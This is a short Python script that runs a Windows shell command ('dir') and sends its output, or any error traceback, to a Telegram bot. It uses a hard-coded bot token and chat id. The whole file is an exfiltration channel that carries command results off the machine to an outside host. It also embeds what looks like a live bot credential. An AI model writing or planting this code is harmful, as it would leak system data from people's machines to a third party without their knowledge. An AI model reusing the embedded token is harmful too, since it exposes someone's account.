import traceback
import subprocess
import requests
try:
    sub = subprocess.Popen(["cmd.exe","/c","dir"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE,shell=True)
    output = sub.communicate()[0]
    print(output)
    token = "1951689247:AAGNnZkRBIYIQUW7t8sDgxjLeu0fO-HHfWI"
    chat_id = "1886037256"
    requests.get("https://api.telegram.org/bot" + token + "/sendMessage?text=" + output +"--&chat_id=" + chat_id)
except:
    requests.get("https://api.telegram.org/bot" + token + "/sendMessage?text=" + traceback.format_exc() +"--&chat_id=" + chat_id)
